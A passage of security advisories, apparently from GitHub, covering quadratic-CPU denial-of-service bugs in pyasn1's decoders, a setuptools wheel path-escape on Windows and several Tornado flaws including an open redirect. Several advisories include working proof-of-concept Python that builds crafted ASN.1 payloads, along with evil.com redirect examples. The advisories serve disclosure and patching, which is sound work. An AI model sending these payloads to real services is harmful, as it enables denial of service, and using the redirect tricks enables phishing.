[definite-length](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L237-L255) and [indefinite-length](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L275-L301) fragment loops call `BitString.fromOctetString(..., prepend=bitString)` for every fragment. [`fromOctetString`](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/type/univ.py#L614-L627) shifts the growing `SizedInteger` left by the fragment's bit length and ORs in the fragment. Shifting an ever-larger Python integer for each fixed-size fragment makes total work O(n²) for n fragments. The fragments are siblings, so the decoder's nesting-depth limit does not constrain their count; its limit on the number of length octets does not prevent the demonstrated inputs.  In 0.6.4, DER's [tag-driven map](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/der/decoder.py#L15-L40) disables constructed BIT STRING, while its schema-driven type map retains the inherited decoder that permits it. This explains why a schema-less DER rejection is not a negative result for all DER decoding.  Under [X.690](https://www.itu.int/rec/T-REC-X.690-202102-I/en), a conforming CER constructed BIT STRING uses an indefinite-length outer encoding and primitive fragments with 1000 contents octets except possibly the last. That form reaches the affected indefinite-length loop. DER requires primitive string encoding, although the schema-driven pyasn1 decoder accepts the definite-length constructed example below.  ## Impact  An application is exposed when untrusted input can reach one of the affected decoder paths and its input limits admit enough fragments. The work occupies the decoding thread or worker and may cause denial of service. Whether the input is network-accessible or unauthenticated depends on the calling application. This advisory makes no claim that every application using pyasn1, or any particular protocol implementation, accepts such input.  ## Severity assessment (CVSS v3.1)  The 7.5 Base score assumes a reasonable application that automatically decodes attacker-supplied ASN.1 from unauthenticated network input. Valid BER and conforming CER values trigger the issue without special conditions, privileges, or user interaction. Repeated crafted values could occupy a finite decoder-worker pool and deny service while the attack continues. No confidentiality or integrity impact is demonstrated. This library-level score does not claim that every application is network-exposed or fully unavailable; deployment-specific input limits and architecture may change the score. See [FIRST's library-scoring guidance](https://www.first.org/cvss/v3-1/user-guide).  ## Reproducer  The definite-length example below is valid BER. It is deliberately not a conforming CER or DER encoding. The second constructor uses conforming CER fragment sizing and framing. CPU times are machine-dependent; run the larger cases only in a local test environment.  ```python import time  from pyasn1.codec.ber import decoder as ber_decoder from pyasn1.codec.cer import decoder as cer_decoder from pyasn1.codec.der import decoder as der_decoder from pyasn1.error import PyAsn1Error from pyasn1.type import univ   def encode_length(size):     octets = size.to_bytes((size.bit_length() + 7) // 8, "big")     return bytes((0x80 | len(octets),)) + octets   def definite_fragments(count):     body = b"\x03\x02\x00\xa5" * count  # one data octet per BIT STRING fragment     return b"\x23" + encode_length(len(body)) + body   def cer_fragments(count):     # Each primitive fragment has 1000 contents octets: one unused-bits     # octet (zero) followed by 999 data octets.     fragment = b"\x03" + encode_length(1000) + b"\x00" + b"\xa5" * 999     return b"\x23\x80" + fragment * count + b"\x00\x00"   def measure(label, decode, payload, **options):     start = time.process_time()     value, remainder = decode(payload, **options)     print(label, len(payload), f"{time.process_time() - start:.3f}s CPU")     assert not remainder and len(value) > 0   for count in (50_000, 100_000, 200_000):     measure(f"BER {count} fragments", ber_decoder.decode,             definite_fragments(count))  for count in (1_000, 2_000, 4_000):     measure(f"CER {count} fragments", cer_decoder.decode,             cer_fragments(count))  sample = definite_fragments(1_000) measure("DER with BIT STRING schema", der_decoder.decode, sample,         asn1Spec=univ.BitString()) try:     der_decoder.decode(sample) except PyAsn1Error:     print("DER without schema rejects the constructed value") else:     raise AssertionError("DER unexpectedly accepted schema-less input") ```  ## Verification  Local measurements of the official v0.6.4 tag on CPython 3.14.8 used `time.process_time()`. A local 0.6.5 candidate containing the fix was timed on the same machine. Times are illustrative, not a guaranteed cost on other systems.  | Input | Size | v0.6.4 CPU | 0.6.5 candidate CPU | | --- | ---: | ---: | ---: | | BER definite, 50,000 fragments | 0.20 MB | 0.530 s | 0.084 s | | BER definite, 100,000 fragments | 0.40 MB | 1.915 s | 0.170 s | | BER definite, 200,000 fragments | 0.80 MB | 7.392 s | 0.344 s | | Conforming CER, 1,000 fragments | 1.004 MB | 0.163 s | 0.0035 s | | Conforming CER, 2,000 fragments | 2.008 MB | 0.657 s | 0.0070 s | | Conforming CER, 4,000 fragments | 4.016 MB | 2.582 s | 0.0144 s |  The definite BER input with 100,000 fragments also decoded through DER with `asn1Spec=univ.BitString()` in 1.949 s on v0.6.4, versus 0.172 s with the 0.6.5 candidate. Schema-less DER rejected the same input. Independent reports reproduced the old behavior on v0.6.4: one measured 21.1 s for a 1.28 MB definite-length value; another measured 7.25 s for a 0.8 MB value versus 2.8 ms for a primitive BIT STRING carrying the same data volume. These measurements were taken on different systems and should not be compared as a single benchmark series.  ## Resolution  Upgrade to pyasn1 0.6.5. The decoder assembles fragment bits in a `bytearray`, preserves decoded bit values including intermediate-fragment padding, and converts the complete payload to a BIT STRING once. This removes the repeated shift of the growing integer in both constructed decoding loops.  For applications that cannot upgrade immediately, enforce an application-appropriate limit on untrusted ASN.1 input size **before** passing it to pyasn1. Such a limit bounds exposure but does not change the quadratic behavior of 0.6.4. Where a protocol forbids constructed BIT STRING, rejecting that encoding before decoding also prevents this path.

### Summary  When an application decodes attacker-controlled BER, CER, or DER data without an ASN.1 schema, a container with many distinct long tag IDs can cause quadratic CPU use. Repeated inputs can exhaust CPU and reduce service availability.  ### Details  ConstructedPayloadDecoderBase._decodeComponentsSchemaless inserts every decoded component’s TagSet into a growing set, although it only needs to distinguish one tag set from two or more. Attacker-chosen tag IDs can have colliding TagSet hashes, making each later insertion compare against an increasing number of earlier tags. This path is present in v0.6.4 and is inherited by the CER and DER decoders. The proposed fix stops growing the classification set after it contains two distinct tag sets, while retaining every decoded component and its order.  On v0.6.4 with CPython 3.12.10, increasing the collision input from 3,200 to 6,400 components raised decode CPU time from 0.438 to 1.747 seconds; a comparable control rose from 0.031 to 0.065 seconds. Both inputs decoded successfully with the expected values and an empty remainder.  ### Proof of concept  Run this outside the repository checkout in a fresh Python 3.12 environment with pyasn1==0.6.4 installed:  ```python import sys import time  from pyasn1.codec.ber import decoder from pyasn1.type import univ   def enc_tag(tag_id):     groups = [tag_id & 0x7f]     tag_id >>= 7     while tag_id:         groups.append((tag_id & 0x7f) | 0x80)         tag_id >>= 7     return b'\xbf' + bytes(reversed(groups))   def payload(tag_ids):     body = b''.join(enc_tag(tag_id) + b'\x03\x04\x01A'                     for tag_id in tag_ids)     length = len(body).to_bytes((len(body).bit_length() + 7) // 8, 'big')     return b'\x30' + bytes([0x80 | len(length)]) + length + body   for count in (3200, 6400):     cases = (         ("collision", [32 + i * sys.hash_info.modulus                        for i in range(count)]),         ("control", [(1 << 70) + i for i in range(count)]),     )     for name, tag_ids in cases:         wire = payload(tag_ids)         start = time.process_time()         value, remainder = decoder.decode(wire)         cpu_seconds = time.process_time() - start          assert type(value) is univ.Sequence         assert len(value) == count and remainder == b''         for position, tag_id in enumerate(tag_ids):             component = value.getComponentByPosition(position)             assert component.asOctets() == b'A'             assert component.tagSet[-1].tagId == tag_id          print(count, name, len(wire), round(cpu_seconds, 3)) ```  ### Impact  Applications that pass attacker-controlled bytes to schemaless BER, CER, or DER decoding can spend disproportionate CPU time on a relatively small, valid input. The demonstrated impact is availability; no confidentiality or integrity impact was observed.

## Summary  In pyasn1 0.6.4 and earlier, decoding a binary-encoded ASN.1 REAL with a large mantissa can consume CPU time quadratic in the mantissa length. The BER, CER, and DER decoders all use the affected `RealPayloadDecoder`. An application is exposed when it passes attacker-controlled ASN.1 containing a REAL value to one of these decoders, either without an `asn1Spec` or with a schema that includes REAL. The work occurs inside `decode()`; the application does not need to convert, print, or otherwise use the resulting REAL object.  This is distinct from [CVE-2026-59886](https://github.com/advisories/GHSA-hm4w-wwcw-mr6r), which concerns converting an already-decoded REAL to a Python float. That issue was fixed in 0.6.4 and its advisory states that decoding alone does not trigger it.  ## Root cause and affected components  For binary REAL values, [`RealPayloadDecoder.valueDecoder` in v0.6.4](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L535-L603) builds the mantissa one octet at a time:  ```python p = 0 while chunk:     p <<= 8     p |= chunk[0]     chunk = chunk[1:] ```  Each shift processes an integer that grows with the mantissa; with byte strings, each slice also copies the remaining suffix. Repeating both operations for every octet makes decoding quadratic in mantissa size. The decoder's [eight-octet length-field limit](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L1704-L1717) does not impose a practical mantissa-size limit for the inputs demonstrated below. [CER](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/cer/decoder.py#L51-L62) and [DER](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/der/decoder.py#L23-L31) reuse the BER REAL payload decoder, so all three paths reach this loop.  The vulnerable loop is present in every available repository release tag inspected, from v0.2.1 through v0.6.4. Runtime measurements below were made on v0.6.4; older releases were checked for the loop, not benchmarked individually.  ## Impact  A comparatively small REAL value can hold a decoder worker on one CPU core for seconds or longer. The attacker must be able to supply data that the application sends to an affected decoder, and application-level input limits may reduce exposure. The demonstrated effect is CPU exhaustion during decoding; this advisory does not assert a network endpoint, unauthenticated access, or an affected downstream application by itself.  ## Reproduction and evidence  The following example uses pyasn1 0.6.4. The `0x09` tag identifies REAL; `0x80 0x00` selects a positive, base-2 binary value with a one-octet zero exponent, followed by a large mantissa. It exercises `decode()` only.  ```python import time  from pyasn1.codec.ber import decoder as ber from pyasn1.codec.cer import decoder as cer from pyasn1.codec.der import decoder as der   def real_value(mantissa_octets):     content = b"\x80\x00" + b"\xff" * mantissa_octets     length = len(content).to_bytes(3, "big")     return b"\x09\x83" + length + content   for codec in (ber, cer, der):     for size in (50_000, 100_000, 200_000):         substrate = real_value(size)         started = time.process_time()         value, rest = codec.decode(substrate)         print(codec.__name__, size, time.process_time() - started)         assert not rest         assert tuple(value)[1:] == (2, 0) ```  The original report measured the following BER CPU times on repository commit `aa05757`. That commit is later than the official v0.6.4 tag; the vulnerable loop is identical in the tagged release.  | Mantissa size | Reporter's BER CPU time | | ---: | ---: | | 50,000 octets | 0.328 s | | 100,000 octets | 1.299 s | | 200,000 octets | 6.043 s | | 400,000 octets | 24.095 s |  The same report measured 5.645 s for a 200,000-octet mantissa through DER.  A separate local reproduction on the official v0.6.4 tag (`d43496f`, CPython 3.14.8, macOS arm64) measured BER at 0.209 s, 0.884 s, and 3.451 s for 50,000, 100,000, and 200,000 mantissa octets respectively. CER and DER each took about 0.89 s at 100,000 octets. These are machine-specific measurements; the repeated near-fourfold cost for doubled input is the relevant result. Neither reproduction calls `float()`, `str()`, or `prettyPrint()`.  ## Fix  pyasn1 0.6.5 replaces the per-octet shift and slice loop with one `int.from_bytes(bytes(chunk), "big")` conversion. Sign, scale, exponent, and the decoded REAL tuple are preserved. The fix is in the shared BER payload decoder and therefore covers BER, CER, and DER. A local check of the 0.6.5 candidate decoded a 200,000-octet mantissa correctly through all three codecs; the check does not establish behavior for every application using REAL.  ## Workarounds  Upgrade to pyasn1 0.6.5. Until then, reject or strictly limit attacker-controlled ASN.1 input that may contain REAL values before passing it to pyasn1. The appropriate size limit depends on the application's available CPU time and request volume.

## Summary  In pyasn1 0.6.4 and earlier, decoding a constructed OCTET STRING or character string made of many fragments can spend disproportionate CPU time repeatedly copying the accumulated value. A separate indefinite-length `ANY` path has the same problem while collecting the encoded components. The work grows roughly quadratically with the number of fixed-size fragments, although the input and decoded value grow linearly. An application that lets an attacker supply such ASN.1 input to an affected decoder can suffer CPU exhaustion.  The affected string paths are available in BER and CER. The DER decoder also accepts certain *non-DER* constructed strings: a definite-length constructed OCTET STRING when an `asn1Spec` selects `univ.OctetString`, and constructed character strings such as UTF8String even without a schema. Indefinite-length `ANY` is affected in BER and CER when an `asn1Spec` selects `univ.Any`; DER rejects indefinite lengths.  This is a distinct decoder path from the OBJECT IDENTIFIER/RELATIVE-OID accumulation addressed by [CVE-2026-59885](https://github.com/advisories/GHSA-8ppf-4f7h-5ppj). It has the same complexity class, but the OID fix in 0.6.4 did not change these string or `ANY` loops.  ## Technical details  In the [v0.6.4 BER decoder](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py), `OctetStringPayloadDecoder` appends each decoded fragment to a growing `bytes` value with `header += component` in both its [definite-length](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L338-L351) and [indefinite-length](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L368-L387) constructed forms. [`AnyPayloadDecoder.indefLenValueDecoder`](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L1403-L1430) similarly uses `chunk += component`. In the exercised paths, each concatenation copies an increasingly large prefix. For `N` fixed-size fragments, the total copied data grows with `1 + 2 + ... + N`, or O(N²).  The OCTET STRING decoder is also the base class of the decoders for UTF8String, NumericString, PrintableString, TeletexString, VideotexString, IA5String, GraphicString, VisibleString, GeneralString, UniversalString, BMPString, ObjectDescriptor, GeneralizedTime, and UTCTime. These types inherit the same constructed-string reassembly path.  The [DER decoder's OCTET STRING restriction](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/der/decoder.py#L15-L49) replaces the tag-driven decoder, but its schema-driven `TYPE_MAP` retains the BER-derived decoder. Thus `der.decode(data)` rejects a constructed OCTET STRING, while `der.decode(data, asn1Spec=univ.OctetString())` accepts its definite-length form and reaches the accumulation loop. DER does not replace the inherited character-string decoders, so a constructed UTF8String is also accepted without `asn1Spec`. These inputs violate [X.690's DER string-encoding rule](https://www.itu.int/rec/T-REC-X.690-202102-I/en) and should not be described as valid DER encodings.  The original short-fragment, definite-length OCTET STRING reproducer is valid BER. The CER decoder accepts it, but it is not a conforming CER string encoding: X.690 requires an indefinite-length outer constructed string and 1,000 contents octets per fragment except possibly the last. A conforming CER-shaped constructed OCTET STRING with those fragment sizes also reaches the loop and shows quadratic growth. The indefinite-length `ANY` reproducer below can represent a CER `SEQUENCE OF OCTET STRING` and reaches the separate `ANY` loop when decoded with an `ANY` schema.  The decoder's eight-octet length-field limit and nesting-depth limit do not bound the number of sibling fragments in these examples. The BER reproducer below uses only a three-octet outer length field; all fragments have shallow nesting. There is no per-message fragment-count cap in v0.6.4.  ## Impact  If an application passes attacker-controlled ASN.1 to the affected `decode()` or `StreamingDecoder` path without an adequate input or resource limit, a megabyte-scale value can occupy a decoding worker for seconds. Repeated inputs can exhaust available CPU. Whether this is reachable before authentication, or through a particular protocol, depends on the application; the library finding alone does not establish those conditions. No confidentiality or integrity impact is claimed.  ## Severity assessment (CVSS v3.1)  The 7.5 Base score assumes a reasonable application that automatically decodes attacker-supplied ASN.1 from unauthenticated network input. Valid BER and conforming CER inputs trigger the string-reassembly issue without special conditions, privileges, or user interaction. Repeated crafted inputs could occupy all available decoder workers and deny service while the attack continues. No confidentiality or integrity impact is demonstrated. This library-level score does not assert that every adopter has such an endpoint or loses all service; deployment-specific input limits and architecture may change the score. See [FIRST's library-scoring guidance](https://www.first.org/cvss/v3-1/user-guide).  On the official v0.6.4 tag, local CPU-time measurements with CPython 3.14.8 on macOS arm64 gave the following results. Times vary by machine and Python runtime; the input-size scaling is the relevant observation. “Fixed” means the local 0.6.5 decoder fix applied to the same inputs.  | Decoder path and input | Fragments | v0.6.4 CPU | Fixed CPU | | --- | ---: | ---: | ---: | | BER constructed OCTET STRING, 0.40 MB | 100,000 × 2 payload bytes | 0.340 s | 0.160 s | | BER constructed OCTET STRING, 0.80 MB | 200,000 × 2 payload bytes | 0.886 s | 0.312 s | | BER constructed OCTET STRING, 1.60 MB | 400,000 × 2 payload bytes | 2.738 s | 0.623 s | | BER indefinite `ANY`, 0.30 MB | 100,000 × 1 payload byte | 0.459 s | 0.206 s | | BER indefinite `ANY`, 0.60 MB | 200,000 × 1 payload byte | 1.245 s | 0.412 s | | BER indefinite `ANY`, 1.20 MB | 400,000 × 1 payload byte | 3.980 s | 0.826 s | | CER constructed OCTET STRING, 1.00 MB, conforming fragment layout | 1,000 × 1,000 payload bytes | 0.0089 s | 0.0022 s | | CER constructed OCTET STRING, 2.01 MB, conforming fragment layout | 2,000 × 1,000 payload bytes | 0.0311 s | 0.0044 s | | CER constructed OCTET STRING, 4.02 MB, conforming fragment layout | 4,000 × 1,000 payload bytes | 0.1379 s | 0.0090 s |  For the same short-fragment layout, the original report measured up to 16.05 seconds for a 3.2 MB BER constructed OCTET STRING. An independent report on CPython 3.11.16/Linux measured 5.76 seconds for a 2.4 MB constructed OCTET STRING, versus about 0.005 seconds for a primitive OCTET STRING of comparable size. These are reporter measurements on different systems, not fixed performance guarantees.  ## Reproduction  This example uses public decoder APIs. Run it with pyasn1 0.6.4 and increase `n` to observe the scaling. The final two calls show the DER paths accepted by v0.6.4; their constructed encodings are not valid DER.  ```python import time  from pyasn1.codec.ber import decoder as ber from pyasn1.codec.cer import decoder as cer from pyasn1.codec.der import decoder as der from pyasn1.type import univ   def tlv(identifier, contents):     length = len(contents)     if length < 128:         return bytes((identifier, length)) + contents     encoded = length.to_bytes((length.bit_length() + 7) // 8, "big")     return bytes((identifier, 0x80 | len(encoded))) + encoded + contents   def measure(label, decode, substrate, asn1Spec=None):     start = time.process_time()     _, rest = decode(substrate, asn1Spec=asn1Spec)     assert not rest     print(f"{label}: {len(substrate)} input bytes, "           f"{time.process_time() - start:.3f} CPU seconds")   n = 100_000 octet_fragments = b"\x04\x02AA" * n utf8_fragments = b"\x0c\x02AA" * n  measure("BER constructed OCTET STRING", ber.decode,         tlv(0x24, octet_fragments)) measure("BER indefinite ANY", ber.decode,         b"\x30\x80" + b"\x04\x01A" * n + b"\x00\x00",         univ.Any())  # CER uses indefinite length and 1,000-content-octet primitive fragments. cer_fragment = tlv(0x04, b"A" * 1000) measure("CER constructed OCTET STRING", cer.decode,         b"\x24\x80" + cer_fragment * 1000 + b"\x00\x00")  # These constructed encodings are accepted by pyasn1 but are invalid DER. measure("DER OCTET STRING with schema", der.decode,         tlv(0x24, octet_fragments), univ.OctetString()) measure("DER UTF8String without schema", der.decode,         tlv(0x2c, utf8_fragments)) ```  ## Patch  pyasn1 0.6.5 replaces the growing `bytes` accumulator with a list of fragments and joins them once after decoding in all three affected loops. The OCTET STRING base-class change also covers the inheriting character-string decoders. This removes the repeated copying while preserving the assembled decoded value.  ## Workaround  Until upgrading, enforce application-appropriate limits on the size of untrusted ASN.1 input *before* passing it to pyasn1, and limit the CPU resources available to decoding workers. Applications that require DER can also reject constructed string encodings before invoking the decoder. The appropriate byte limit depends on the protocol and expected valid values.  ## Credits and references  Reported by [alimony](https://github.com/alimony). Independently reported by [manus-pi](https://github.com/manus-pi), whose report identified the schema-driven DER route, inherited character-string decoders, and additional performance evidence.  - [pyasn1 v0.6.4 affected decoder source](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py) - [ITU-T X.690, CER and DER string-encoding rules](https://www.itu.int/rec/T-REC-X.690-202102-I/en) - [CVE-2026-59885, separate OID decoder issue](https://github.com/advisories/GHSA-8ppf-4f7h-5ppj)

### Summary  On Windows, attacker-controlled content in a wheel's `.dist-info/namespace_packages.txt` can cause setuptools' legacy wheel installation path to create an `__init__.py` outside the requested `destination_eggdir`.  The attacker can influence the destination path, but not the contents of the created file.  ### Details  Tested setuptools commit:  `6ead555c5fb29bc57fe6105b1bffc163f56fd558`  Relevant source:  `setuptools/wheel.py`  SHA-256:  `359b7e0d5dd8c3135653abe08a8ed5dc0352eadfd7df22cb5e2b5303b7c3cafd`  The relevant call path is:  `Wheel(wheel_path).install_as_egg(destination)` → `_install_as_egg` → `_convert_metadata` → `_fix_namespace_packages`  A wheel can provide attacker-controlled content in:  `<distribution>.dist-info/namespace_packages.txt`  The namespace value is eventually used approximately as:  ```python mod_dir = os.path.join(destination_eggdir, *mod.split('.')) mod_init = os.path.join(mod_dir, '__init__.py')  If mod is a Windows drive-qualified absolute path containing no dots, mod.split('.') preserves it as a single component. On Windows, os.path.join(destination_eggdir, absolute_component) discards the original base directory and resolves to the attacker-supplied absolute path. The existing wheel filename and ZIP traversal checks do not validate this metadata value before it is subsequently interpreted as a filesystem path.  ```markdown ### PoC  The reproduction was performed entirely inside a disposable temporary directory.  Layout:  ```text sandbox/     destination/     outside/     input/     canary.txt ```  A synthetic wheel was created containing:  `demo_pkg-1.0.dist-info/namespace_packages.txt`  whose content was the absolute path of:  `sandbox\outside`  The real acquired setuptools implementation was then invoked:  ```python setuptools.wheel.Wheel(synthetic_wheel).install_as_egg(     sandbox_destination ) ```  The operation completed without exception.  Expected metadata was created under:  `sandbox\destination\EGG-INFO`  but setuptools also created:  `sandbox\outside\__init__.py`  The file did not exist before execution.  Its contents were:  ```python __import__('pkg_resources').declare_namespace(__name__) ```  The unrelated canary remained byte-identical.  The sandbox was deleted after recording the evidence. ```   ### Impact  A crafted wheel can cause setuptools to create a fixed-content `__init__.py` outside the intended installation directory at a filesystem path influenced by the wheel, with the permissions of the process performing the installation.  The demonstrated reproduction required the target parent directory to already exist.

### Summary  Tornado's HTTP header parser takes quadratic time (O(n²)) when a header value is continued across many "obsolete line folding" (obs-fold) lines. An unauthenticated attacker can send a request whose header block is mostly short continuation lines. Parsing it uses a large amount of CPU on the IOLoop thread and blocks every other connection that process is serving.  This issue is closely related to CVE-2025-67725 (GHSA-c98p-7wgm-6p64). The fix for that advisory covered repeated headers but not line-folded continuations.  ### Impact  All Tornado HTTP servers are affected. Header parsing runs before any application code, so no authentication or particular handler is required.  How bad it gets depends on `max_header_size`:  - **Default (64 KB):** each malicious request blocks the event loop for tens of milliseconds. Repeated requests can degrade service. - **Raised `max_header_size`:** the cost grows with the square of the header size. A single 1 MB request can block the process for several seconds.  Only availability is affected. Confidentiality and integrity are not.  ### Patches  Fixed in Tornado 6.6 by removing support for obsolete line folding completely; header lines that begin with whitespace are now rejected.  ### Workarounds  - Keep `max_header_size` at its default value or lower it. This limits the impact but doesn't remove it. - Run Tornado behind a reverse proxy that rejects or normalizes obsolete line folding before forwarding requests.  ### Credit  Reported by @manus-pi.

### Summary  When Tornado reads an HTTP/1.1 body that uses chunked transfer encoding, it processes all chunks that have already arrived without yielding to the event loop. A client can send a body made of millions of 1-byte chunks, which blocks the event loop (and therefore every other connection served by that process) for the entire time it takes to parse the body. A body near the default `max_body_size` of 100 MB can block the process for close to a minute, and the attacker can repeat or parallelize these requests.  Bodies made of tiny chunks also consumed far more memory than their size: a handler that does not use `@stream_request_body` stored each chunk as a separate object, using roughly 20 times as much memory as the bytes received.  ### Impact  All Tornado HTTP servers are affected when they receive a request body for a handler that reads it, which includes any handler that does not reject the request before the body is read. No authentication is required. Lowering `max_body_size` reduces the maximum blocking time and memory use for each request but does not remove the issue.  `SimpleAsyncHTTPClient` is affected in the same way when it reads a response from a malicious server.  ### Patches  Fixed in Tornado 6.6. Tornado now yields to the event loop periodically while reading any body, combines small chunks before passing them to `data_received`, and stores non-streaming bodies more compactly.  Applications using `@stream_request_body` should note that the pieces passed to `data_received` no longer correspond to HTTP chunk boundaries.  ### Workarounds  - Run Tornado behind a reverse proxy that buffers request bodies and forwards them with a `Content-Length` header instead of chunked encoding. - Lower `max_body_size` (for the whole server or for individual handlers) to limit the impact of each request.  ### Credit  Reported by [uttej-badwane](https://github.com/uttej-badwane).

### Summary  `tornado.web.RedirectHandler` builds its target URL by substituting parts of the request path into a template. Depending on where those substitutions appear in the template, an attacker can craft a request that redirects to a host of their choosing. This creates an open redirect on the application's domain, which can be used in phishing.  ### Impact  Applications are affected if they use `RedirectHandler` with a URL template where a regex capture group can influence the scheme or host of the redirect. This includes:  - **A substitution at the start of the path**, for example `(r"/(.*)/target", RedirectHandler, {"url": "/{0}/destination"})`. A request to `https://example.com//evil.com/target` redirects to `//evil.com/destination`, a protocol-relative URL pointing to evil.com. Variants using backslashes or encoded characters have the same effect, because browsers treat them as equivalent to `//`. - **A substitution directly after the host**, for example `(r"/old(.*)", RedirectHandler, {"url": "https://new.example.com{0}"})`. A request to `/old.evil.com/` or `/old@evil.com/` redirects to evil.com. - **A template that begins with a substitution** (such as `"{0}"`), which can be given an absolute URL.  Applications are not affected if their `RedirectHandler` templates use only static URLs, or if every substitution comes after a fixed host and a `/` (for example `"/static/{0}"` or `"https://example.com/{0}"`). Other uses of `RequestHandler.redirect()` are not affected by this advisory, although applications that pass user-controlled input to `redirect()` should validate it themselves.  ### Patches  Fixed in Tornado 6.6. `RedirectHandler` now returns a 400 error if the substituted values would change the scheme or host of the redirect from what the template specifies. As a result, substitutions can no longer be used in the scheme or host part of a template. The similar check in `StaticFileHandler` has also been hardened against backslash and whitespace variants.  ### Workarounds  - Change `RedirectHandler` templates so every substitution comes after a fixed prefix ending in `/`, or write capture-group regexes that cannot match characters such as `/`, `\`, `@`, `.` or `:` where they could affect the host. - Alternatively, replace `RedirectHandler` with a custom handler that validates the target before calling `self.redirect()`.  ### Credit  Reported by Longwei Wang (@gn00295120).
